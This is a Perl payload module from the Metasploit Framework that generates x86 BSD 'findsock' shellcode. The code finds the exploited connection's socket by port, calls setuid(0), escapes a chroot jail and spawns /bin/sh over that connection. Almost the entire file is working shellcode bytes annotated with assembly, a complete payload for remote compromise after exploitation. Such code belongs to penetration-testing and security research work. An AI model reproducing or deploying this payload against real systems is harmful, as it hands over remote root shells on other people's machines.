
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors fields below. In the
# case of an Unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsdx86_findsock;
use strict;
use base 'Msf::PayloadComponent::FindConnection';

my $info =
{
  'Name'         => 'bsdx86findsock',
  'Version'      => '$Revision$',
  'Description'  => 'Spawn a shell on the established connection',
  'Authors'      => [ 'LSD [Unknown License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Size'         => '',
  'UserOpts'     =>
    {
      'CPORT' => [1, 'PORT', 'Local port used by exploit'],
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('CPORT')));
}

sub Generate {
  my $self = shift;
  my $port = shift;
  my $off_port = 35;
  my $port_bin = pack('n', $port);

  my $shellcode = # bsd findsock code by lsd (mod by hdm)
  # clear some stack space
  "\x81\xec\x00\x02\x00\x00" . # sub esp, 512
  "\x89\xe7"                 . # mov edi, esp
  
  # char findsckcode[]=    # /* 59 bytes                       */
  
  #"\x56"                 . # /* pushl   %esi                   */
  #"\x5f"                 . # /* popl    %edi                   */
  #"\x83\xef\x7c"         . # /* subl    $0x7c,%edi             */
  
  "\x57"                 . # /* pushl   %edi                   */
  "\xb0\x10"             . # /* movb    $0x10,%al              */
  "\xab"                 . # /* stosl   %eax,%es:(%edi)        */
  "\x57"                 . # /* pushl   %edi                   */
  "\x31\xc9"             . # /* xorl    %ecx,%ecx              */
  "\xb1\xff"             . # /* movb    $0xff,%cl              */ 
  "\x51"                 . # /* pushl   %ecx                   */
  "\x33\xc0"             . # /* xorl    %eax,%eax              */
  "\xb0\x1f"             . # /* movb    $0x1f,%al              */
  "\x51"                 . # /* pushl   %ecx                   */
  "\xcd\x80"             . # /* int     $0x80                  */
  "\x59"                 . # /* popl    %ecx                   */
  "\x59"                 . # /* popl    %ecx                   */
  "\x33\xdb"             . # /* xorl    %ebx,%ebx              */
  "\x3b\xc3"             . # /* cmpl    %ebx,%eax              */
  "\x75\x0a"             . # /* jne     <findsckcode+40>       */
  "\x66\xbb\x12\x34"     . # /* movw    $0x1234,%bx            */
  "\x66\x39\x5f\x02"     . # /* cmpw    %bx,0x2(%edi)          */
  "\x74\x02"             . # /* je      <findsckcode+42>       */
  "\xe2\xe4"             . # /* loop    <findsckcode+14>       */
  "\x51"                 . # /* pushl   %ecx                   */
  "\x50"                 . # /* pushl   %eax                   */
  "\x91"                 . # /* xchgl   %ecx,%eax              */
  "\xb1\x03"             . # /* movb    $0x03,%cl              */
  "\x49"                 . # /* decl    %ecx                   */
  "\x89\x4c\x24\x08"     . # /* movl    %ecx,0x8(%esp)         */ 
  "\x41"                 . # /* incl    %ecx                   */
  "\xb0\x5a"             . # /* movb    $0x5a,%al              */
  "\xcd\x80"             . # /* int     $0x80                  */
  "\xe2\xf4"             . # /* loop    <findsckcode+47>       */
  
  # char setuidcode[]=     # /* 7 bytes                        */
  "\x33\xc0"             . # /* xorl    %eax,%eax              */
  "\x50"                 . # /* pushl   %eax                   */
  "\xb0\x17"             . # /* movb    $0x17,%al              */
  "\x50"                 . # /* pushl   %eax                   */
  "\xcd\x80"             . # /* int     $0x80                  */

  # char chrootcode[]=     # /* 44 bytes                       */
  "\x68b..."             . # /* pushl   $0x2e2e2e62            */
  "\x89\xe7"             . # /* movl    %esp,%edi              */
  "\x33\xc0"             . # /* xorl    %eax,%eax              */
  "\x88\x47\x03"         . # /* movb    %al,0x3(%edi)          */
  "\x57"                 . # /* pushl   %edi                   */
  "\xb0\x88"             . # /* movb    $0x88,%al              */
  "\x50"                 . # /* pushl   %eax                   */
  "\xcd\x80"             . # /* int     $0x80                  */
  "\x57"                 . # /* pushl   %edi                   */
  "\xb0\x3d"             . # /* movb    $0x3d,%al              */
  "\x50"                 . # /* pushl   %eax                   */
  "\xcd\x80"             . # /* int     $0x80                  */
  "\x47"                 . # /* incl    %edi                   */
  "\x33\xc9"             . # /* xorl    %ecx,%ecx              */
  "\xb1\xff"             . # /* movb    $0xff,%cl              */
  "\x57"                 . # /* pushl   %edi                   */
  "\x50"                 . # /* pushl   %eax                   */
  "\xb0\x0c"             . # /* movb    $0x0c,%al              */
  "\xcd\x80"             . # /* int     $0x80                  */
  "\xe2\xfa"             . # /* loop    <chrootcode+31>        */
  "\x47"                 . # /* incl    %edi                   */
  "\x57"                 . # /* pushl   %edi                   */
  "\xb0\x3d"             . # /* movb    $0x3d,%al              */
  "\x50"                 . # /* pushl   %eax                   */
  "\xcd\x80"             . # /* int     $0x80                  */

  # char shellcode[]=      # /* 23 bytes                       */
  "\x31\xc0"             . # /* xorl    %eax,%eax              */
  "\x50"                 . # /* pushl   %eax                   */
  "\x68//sh"             . # /* pushl   $0x68732f2f            */
  "\x68/bin"             . # /* pushl   $0x6e69622f            */
  "\x89\xe3"             . # /* movl    %esp,%ebx              */
  "\x50"                 . # /* pushl   %eax                   */
  "\x54"                 . # /* pushl   %esp                   */
  "\x53"                 . # /* pushl   %ebx                   */
  "\x50"                 . # /* pushl   %eax                   */
  "\xb0\x3b"             . # /* movb    $0x3b,%al              */
  "\xcd\x80"             ; # /* int     $0x80                  */

  substr($shellcode, $off_port, 2, $port_bin);

  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('4444');
  return(length($bin));
}

1;
